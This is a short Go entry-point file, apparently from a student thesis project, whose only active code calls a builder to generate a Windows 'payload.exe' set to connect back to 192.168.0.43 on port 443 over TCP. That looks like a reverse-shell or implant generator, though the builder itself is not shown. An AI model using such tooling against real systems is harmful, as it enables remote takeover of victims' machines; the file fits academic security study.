package main

import (
	"log"
	"proyecto_grado/builder"
)

func main() {
	// r := gin.Default()
	// routes.RegisterRoutes(r)

	// r.Run(":5000") // Servidor en localhost:8080

	err := builder.BuildPayload("../bin/payload.exe", "windows", "amd64", "192.168.0.43", "443", "tcp", true)

	if err != nil {
		log.Fatal("Error al generar el payload:", err)
	}
}
